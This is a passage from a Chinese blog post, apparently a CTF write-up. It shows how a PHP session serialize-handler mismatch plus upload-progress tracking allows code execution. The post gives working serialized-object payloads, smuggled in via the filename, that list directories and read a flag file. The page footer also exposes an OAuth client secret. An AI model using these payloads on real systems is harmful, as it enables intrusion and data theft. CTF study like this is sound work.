<p>我们可以看到<code>ini_set('session.serialize_handler', 'php')</code>，判断可能存在session反序列化漏洞，根据代码逻辑，访问URL加上<code>phpinfo</code>参数新建对象触发魔术方法执行<code>phpinfo()</code>函数，进一步查看<code>session.serialize_handler</code>配置</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988670_622b0d7ecd9a84139855d-166727395787426.jpeg" alt="img"></p>
<p>可见<code>php.ini</code>中<code>session.serialize_handler = php_serialize</code>，当前目录中被设置为<code>session.serialize_handler = php</code>，因此存在session反序列化利用的条件</p>
<p>补充知识</p>
<blockquote>
<p>phpinfo文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local value(局部变量：作用于当前目录程序，会覆盖master value内容):php</span><br><span class="line">master value(主变量：php.ini里面的内容):php_serialize</span><br></pre></td></tr></table></figure>
</blockquote>
<p>那么我们如何找到代码入口将利用代码写入到<code>session</code>文件？想要写入<code>session</code>文件就得想办法在<code>$_SESSION</code>变量中增加我们可控的输入点</p>
<p>补充知识</p>
<blockquote>
<p><strong>Session 上传进度</strong>(此特性自 PHP 5.4.0 后可用)</p>
<p>当 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a>INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p>
<p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在[<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>S</mi><mi>S</mi><mi>I</mi><mi>O</mi><mi>N</mi><mo stretchy="false">]</mo><mo stretchy="false">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mi>s</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>w</mi><mi>w</mi><mi>w</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant="normal">.</mi><mi>n</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">/</mi><mi>m</mi><mi>a</mi><mi>n</mi><mi>u</mi><mi>a</mi><mi>l</mi><mi mathvariant="normal">/</mi><mi>z</mi><mi>h</mi><mi mathvariant="normal">/</mi><mi>r</mi><mi>e</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">.</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>s</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo stretchy="false">)</mo><mtext>中获得。当</mtext><mi>P</mi><mi>H</mi><mi>P</mi><mtext>检测到这种</mtext><mi>P</mi><mi>O</mi><mi>S</mi><mi>T</mi><mtext>请求时，它会在</mtext><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">_SESSION](https://www.php.net/manual/zh/reserved.variables.session.php)中获得。 当PHP检测到这种POST请求时，它会在`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord">.</span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord">/</span><span class="mord mathnormal">m</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">h</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">当</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord cjk_fallback">检</span><span class="mord cjk_fallback">测</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">种</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord cjk_fallback">请</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">它</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">在</span><span class="mord">‘</span></span></span></span>_SESSION`中添加一组数据, 索引是 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a>与 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。</p>
</blockquote>
<p>翻译成人话就是，当检测Session 上传进度这一特性是开启状态，我们可以在客户端写一个文件上传的功能，文件上传的同时，<code>POST</code>一个与<code>php.ini</code>中设置的<code>session.upload_progress.name</code>同名变量<code>PHP_SESSION_UPLOAD_PROGRESS</code>，如下图，即可写入<code>$_SESSION</code>，进一步序列化写入<code>session</code>文件</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988672_622b0d80327a70a064145-166727395787427.jpeg" alt="img"></p>
<p>下面是官方给出的一个文件上传时监测进度例子:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;&lt;?php echo ini_get(&quot;session.upload_progress.name&quot;); ?&gt;&quot; value=&quot;123&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file2&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>其中<code>name=&quot;&quot;</code>也可以设置为<code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code></p>
<p>在session中存储的上传进度，如下所示:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_SESSION[&quot;upload_progress_123&quot;] = array(</span><br><span class="line"> &quot;start_time&quot; =&gt; 1234567890,   // The request time  请求时间</span><br><span class="line"> &quot;content_length&quot; =&gt; 57343257, // POST content length 长度</span><br><span class="line"> &quot;bytes_processed&quot; =&gt; 453489,  // Amount of bytes received and processed 已接收字节</span><br><span class="line"> &quot;done&quot; =&gt; false,              // true when the POST handler has finished, successfully or not 是否上传完成</span><br><span class="line"> &quot;files&quot; =&gt; array(//上传的文件</span><br><span class="line">  0 =&gt; array(</span><br><span class="line">   &quot;field_name&quot; =&gt; &quot;file1&quot;,       // Name of the &lt;input/&gt; field  input中设定的变量名</span><br><span class="line">   // The following 3 elements equals those in $_FILES             </span><br><span class="line">   &quot;name&quot; =&gt; &quot;foo.avi&quot;,           //文件名</span><br><span class="line">   &quot;tmp_name&quot; =&gt; &quot;/tmp/phpxxxxxx&quot;,</span><br><span class="line">   &quot;error&quot; =&gt; 0,</span><br><span class="line">   &quot;done&quot; =&gt; true,                // True when the POST handler has finished handling this file</span><br><span class="line">   &quot;start_time&quot; =&gt; 1234567890,    // When this file has started to be processed</span><br><span class="line">   &quot;bytes_processed&quot; =&gt; 57343250, // Amount of bytes received and processed for this file</span><br><span class="line">  ),</span><br><span class="line">  // An other file, not finished uploading, in the same request</span><br><span class="line">  1 =&gt; array(</span><br><span class="line">   &quot;field_name&quot; =&gt; &quot;file2&quot;,</span><br><span class="line">   &quot;name&quot; =&gt; &quot;bar.avi&quot;,</span><br><span class="line">   &quot;tmp_name&quot; =&gt; NULL,</span><br><span class="line">   &quot;error&quot; =&gt; 0,</span><br><span class="line">   &quot;done&quot; =&gt; false,</span><br><span class="line">   &quot;start_time&quot; =&gt; 1234567899,</span><br><span class="line">   &quot;bytes_processed&quot; =&gt; 54554,</span><br><span class="line">  ),</span><br><span class="line"> )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>其中，session中的<code>field_name</code>和<code>name</code>都是我们可控的输入点！</p>
<p>下面我们就开始解题拿到flag</p>
<p>首先，<code>http://web.jarvisoj.com:32784/index.php?phpinfo</code>查询设置</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988673_622b0d81b3576c202ffb5-166727395787428.jpeg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled = On   --表明允许上传进度跟踪，并填充$ _SESSION变量</span><br><span class="line">session.upload_progress.cleanup = Off  --表明所有POST数据（即完成上传）后，不清理进度信息($ _SESSION变量)</span><br></pre></td></tr></table></figure>
<p>即允许上传进度跟踪且结束后不清除数据，更有利使用<code>session.upload_progress.name</code>来将利用代码写入<code>session</code>文件</p>
<p>构造<code>POST</code>表单提交上传文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>构造序列化字符串作为<code>payload</code>（利用代码）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz=&#x27;print_r(scandir(dirname(__FILE__)));&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new OowoO();</span><br><span class="line">echo serialize($obj);</span><br><span class="line">?&gt;</span><br><span class="line">//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>为了防止<code>&quot;</code>被转义，我们在<code>payload</code>中加入<code>\</code></p>
<p>随意选择文件，点击表单提交，使用抓包工具<code>burpsuite</code>抓取请求包</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988675_622b0d835c272ae8697f2-166727395787429.jpeg" alt="img"></p>
<p>并修改<code>filename</code>值为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>发送请求包，代码执行过程分析：</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988677_622b0d854159ffbe9883d-166727395787430.jpeg" alt="img"></p>
<p>因此直接执行<code>print_r(scandir(dirname(__FILE__)));</code>并返回</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988680_622b0d88d2b3473a44731-166727395787431.jpeg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo`查看当前目录，`/opt/lampp/htdocs/</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988683_622b0d8b6fba70304dd15-166727395787432.jpeg" alt="img"></p>
<p>构造最终<code>payload</code>读取<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>文件内容，即flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988684_622b0d8cd166d59b7b4d2-166727395787433.jpeg" alt="img"></p>
<h3 id="框架链子"><a class="markdownIt-Anchor" href="#框架链子"></a> 框架链子</h3>
<p>还有一些框架转有的链子，详情遇到再说哦，这里就不过多阐述了QwQ。</p>
<p>祝师傅们，反序列化玩的开心~</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/PHP/" rel="tag"># PHP</a>
              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="prev" title="CTF中zip文件的使用">
                  <i class="fa fa-chevron-left"></i> CTF中zip文件的使用
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/11/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A0%87%E5%87%86%E7%BC%96%E7%A0%81/" rel="next" title="文件头标准编码">
                  文件头标准编码 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">TWe1v3</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">199k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">3:01</span>
  </span>
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>

    </div>
  </footer>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.3/mermaid.min.js","integrity":"sha256-TIYL00Rhw/8WaoUhYTLX9SKIEFdXxg+yMWSLVUbhiLg="}}</script>
  <script src="/js/third-party/tags/mermaid.js"></script>



  




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/katex.min.css" integrity="sha256-uik/hNqHWZldXh/0K35nqOSCff9F61/ZOFReqNOBgB0=" crossorigin="anonymous">
  <script class="next-config" data-name="katex" type="application/json">{"copy_tex_js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/contrib/copy-tex.min.js","integrity":"sha256-Us54+rSGDSTvIhKKUs4kygE2ipA0RXpWWh0/zLqw3bs="}}</script>
  <script src="/js/third-party/math/katex.js"></script>


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"TWe1v3# GitHub repo owner","repo":"TWe1v3-Blogcomment","client_id":"b1f12cb0fd210a7f001b# GitHub Application Client ID","client_secret":"80355aa1b174d1926079780262cdc80f1ca96516","admin_user":"TWe1v3","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"75b9116566e5707e3d9920a58b78b1d3"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>


<script src="/live2d-widget/autoload.js"></script>
</body>
</html>
